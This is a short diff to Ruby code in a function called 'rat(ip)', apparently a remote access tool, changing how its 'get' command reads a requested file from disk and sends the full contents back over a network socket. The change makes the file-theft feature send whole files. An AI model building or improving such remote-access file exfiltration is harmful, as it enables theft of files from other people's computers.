@@ -62,15 +62,13 @@ def rat(ip)
       when 'get'
         if File.exist? file
           if format == 'binary'
-            file = File.open(file, 'rb')
+            content = File.binread file
           elsif format == 'text'
-            file = File.open(file, 'r')
+            content = File.read file
           else
             socket.puts 'done'
           end
-          content = file.gets
           socket.puts content
-          file.close
           socket.puts 'done'
         else
           socket.puts 'error'
